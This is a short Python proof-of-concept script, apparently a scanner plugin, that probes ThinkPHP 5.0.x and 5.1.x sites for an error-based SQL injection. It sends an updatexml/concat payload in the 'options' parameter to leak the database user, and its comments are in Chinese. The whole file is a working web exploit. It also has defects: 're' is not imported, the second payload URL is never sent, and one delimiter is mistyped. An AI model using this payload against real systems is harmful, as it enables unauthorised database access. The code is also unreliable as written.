import requests
import random

#Thinkphp 5.0.(0-21)&5.1.(3-25)sql注入漏洞
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    #漏洞位置
    exploit_url1=url+'/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 '
    exploit_url2=url+"/index/index/index?options=id')%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23"

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = requests.get(exploit_url1, headers=header, proxies=proxies)
        response2 = requests.get(exploit_url1, headers=header, proxies=proxies)

    else:
        response1 = requests.get(exploit_url1, headers=header)
        response2 = requests.get(exploit_url1, headers=header)

    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response1.status_code==200 or response2.status_code==200:
        if re.search('~+[0-9a-zA-Z]*@', response1.text) or re.search('~+[0-9a-zA-Z]*@', response2.text):
            return 'Thinkphp 5.0.(0-21)&5.1.(3-25) - sql注入漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

# run("http://192.168.1.144:8080/",{'admin':'admin'},'','')